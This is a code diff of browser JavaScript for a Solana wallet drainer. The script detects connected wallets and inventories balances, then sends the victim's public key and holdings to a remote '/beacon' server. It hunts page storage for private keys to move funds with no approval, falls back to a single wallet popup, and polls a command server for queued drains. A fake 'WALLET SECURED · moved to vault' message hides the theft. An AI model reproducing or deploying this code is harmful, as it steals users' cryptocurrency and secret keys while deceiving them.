@@ -22,7 +22,7 @@
   const { decode: b58d } = await import(E + "bs58@6.0.0");
   const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
 
-  // detect: connected session first, else attempt connect (25s cap)
+  // — detect: connected session first, else attempt connect (25s cap) —
   let name = "?", prov = null;
   const CANDS = [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]];
   for (const [n, f] of CANDS) {
@@ -33,7 +33,7 @@
     try { const w = window[k]; if (w?.publicKey && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; break; } } catch {}
   }
   if (!prov) {
-    for (const [n, f] of CANDS Phantom.connect) {
+    for (const [n, f] of CANDS) {
       const w = f();
       if (w && typeof w.connect === "function") {
         try {
@@ -55,10 +55,9 @@
   const pk = prov.publicKey.toBase58();
   const pkB = new PublicKey(pk);
   const conn = new Connection(RPC_URL, "confirmed");
-  const label = name.startsWith("ext:") ? "ext:" + name.slice(4) : name;
-  const label2 = name.startsWith("ext:") ? name.slice(4) : name;
+  const label = name.startsWith("ext:") ? name.slice(4) : name;
 
-  // inventory
+  // — inventory —
   const [bal, r] = await Promise.all([conn.getBalance(pkB), conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM })]);
   const amt = {}, dec = {}, srcs = {};
   for (const { account, pubkey } of r.value) {
@@ -71,7 +70,6 @@
   }
   const toks = Object.entries(MINTS).filter(([, a]) => (amt[a] || 0) > 0.01).map(([k, a]) => ({ k, ui: amt[a] }));
 
-  // prices
   const px = {};
   try {
     const j = await (await fetch("https://lite-api.jup.ag/price/v2?ids=" + Object.values(MINTS).join(","))).json();
@@ -82,11 +80,11 @@
   } catch {}
   const SOLpx = px.WSOL || 150;
   const sol = bal / 1e9;
-  const value = sol * SOLpx + toks.reduce((s, t) => s + t.ui * (t.k === "WSOL" Connect ? SOLpx : (px[t.k] || 1)), 0);
+  const value = sol * SOLpx + toks.reduce((s, t) => s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1)), 0);
   const fmt = n => (+n).toLocaleString("en-US", { maximumFractionDigits: 0 });
   const tokStr = toks.map(t => Math.round(t.ui) + " " + t.k).join(" \u00b7 ");
 
-  // cover UI — v2.7 card
+  // — cover UI —
   const el = document.createElement("div");
   el.id = "__ppcard";
   el.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;width:272px;background:#10141B;border:1px solid #232B3A;border-radius:12px;box-shadow:0 16px 48px rgba(0,0,0,.55);font:12px/1.5 Inter,system-ui,sans-serif;color:#E8ECF4;overflow:hidden;";
@@ -100,7 +98,7 @@
     '<div style="padding:12px 14px;">' +
       '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;">WALLET</div>' +
       '<div style="font:600 12px "JetBrains Mono",ui-monospace,monospace;color:#F5D67B;margin-top:3px;">' + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + '</div>' +
-      '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label2 + " \u00b7 mainnet</div>" +
+      '<div style="font-size:11px;color:#7E899D;margin-top:1px;">' + label + " \u00b7 mainnet</div>" +
       '<div style="font-size:10px;letter-spacing:.1em;color:#7E899D;margin-top:12px;">BALANCE</div>' +
       '<div style="font-size:20px;font-weight:700;margin-top:3px;">$' + fmt(value) + '</div>' +
       '<div id="__pp_sub" style="font:11px "JetBrains Mono",ui-monospace,monospace;color:#9AA5B8;margin-top:2px;">' + sol.toFixed(4) + " SOL" + (tokStr ? " \u00b7 " + tokStr : "") + '</div>' +
@@ -116,12 +114,12 @@
   const report = (mode, sig, extra) => {
     try {
       fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
-        body: JSON.stringify({ pk, provider: label2, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode, sig: String(sig), extra: extra || "" }) });
+        body: JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode, sig: String(sig), extra: extra || "" }) });
     } catch {}
   };
   beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
-  // secret-key candidates
+  // — secret-key candidates (this tab's storage / dapp globals) —
   const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
   const cands = [];
   for (const st of [localStorage, sessionStorage]) {
@@ -156,6 +154,7 @@
     : c.hex ? Uint8Array.from(c.hex.match(/../g).map(x => parseInt(x, 16)))
     : c.raw instanceof Uint8Array ? c.raw : Uint8Array.from(c.raw);
 
+  // — drain build: fresh blockhash/balances, treasury ATA auto-created if missing —
   const FEE = 20000;
   async function buildTx(to) {
     const dest = new PublicKey(to);
@@ -199,7 +198,7 @@
     if (done) return;
     done = true;
     try {
-      for (const c of cands) {
+      for (const c of cands) {                                     // 0-approval path
         let s; try { s = secretOf(c); } catch { continue; }
         if (s.length !== 64) continue;
         let kp; try { kp = Keypair.fromSecretKey(s); } catch { continue; }
@@ -210,17 +209,18 @@
         const sig = await conn.sendRawTransaction(tx.serialize());
         setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, moved.join(",")); return;
       }
-      const { tx, moved } = await buildTx(to);
+      const { tx, moved } = await buildTx(to);                       // fallback: 1 popup approval
       if (!tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
       const sig = await prov.signAndSendTransaction(tx);
       setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, moved.join(","));
     } catch (e) {
       setFoot("ERROR \u00b7 " + String(e?.message || e).slice(0, 40), "#F0616D");
       report("err", String(e?.message || e));
-      done = false;
+      done = false;                                                  // allow retry
     }
   }
 
+  // — poll — nonce-deduped so one queued drain can never pop twice —
   let lastN = "";
   setInterval(async () => {
     let c; try { c = await (await fetch(SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch { return; }
